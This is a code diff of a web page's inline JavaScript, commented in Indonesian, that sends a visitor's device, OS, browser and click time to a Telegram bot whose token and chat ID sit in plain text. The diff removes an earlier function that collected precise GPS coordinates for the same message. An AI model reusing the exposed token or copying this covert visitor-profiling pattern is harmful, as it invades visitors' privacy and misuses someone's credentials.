@@ -141,7 +141,7 @@
 
 <script>
 // ==============================================
-// KONFIGURASI BOT TELEGRAM
+// KONFIGURASI BOT TELEGRAM — TOKEN BARU
 // ==============================================
 const TOKEN_BOT_TELEGRAM = '8958792550:AAGe9geGdlgrv8-6iibu5aquTYX9bq0Vqi0';
 const ID_CHAT_TELEGRAM = '8527556684';
@@ -183,24 +183,6 @@ function deteksiPerangkat() {
 }
 
 // ==============================================
-// DETEKSI LOKASI GPS
-// ==============================================
-function dapatkanLokasi() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve('Geolocation Tidak Didukung');
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => resolve(`📍 ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`),
-            (err) => resolve(err.code === 1 ? '⚠️ Izin Lokasi Ditolak' : 
-                            err.code === 2 ? '⚠️ Lokasi Tidak Tersedia' : `Error: ${err.message}`),
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-        );
-    });
-}
-
-// ==============================================
 // KIRIM KE TELEGRAM
 // ==============================================
 async function kirimKeTelegram(pesan) {
@@ -217,13 +199,12 @@ async function kirimKeTelegram(pesan) {
 }
 
 // ==============================================
-// FUNGSI NOTIFIKASI KEDUA TOMBOL
+// FUNGSI NOTIFIKASI
 // ==============================================
 async function kirimNotifikasi(e, namaLayanan) {
     e.preventDefault();
 
     const perangkat = deteksiPerangkat();
-    const lokasi = await dapatkanLokasi();
     const waktu = new Date().toLocaleString('id-ID', {
         timeZone: 'Asia/Jakarta',
         day: '2-digit', month: 'long', year: 'numeric',
@@ -237,7 +218,6 @@ async function kirimNotifikasi(e, namaLayanan) {
 📱 Perangkat: ${perangkat.nama}
 💻 OS: ${perangkat.os}
 🌐 Browser: ${perangkat.browser}
-📍 Lokasi: ${lokasi}
 🕐 Waktu: ${waktu} WIB
 ━━━━━━━━━━━━━━━━━━━━
     `;
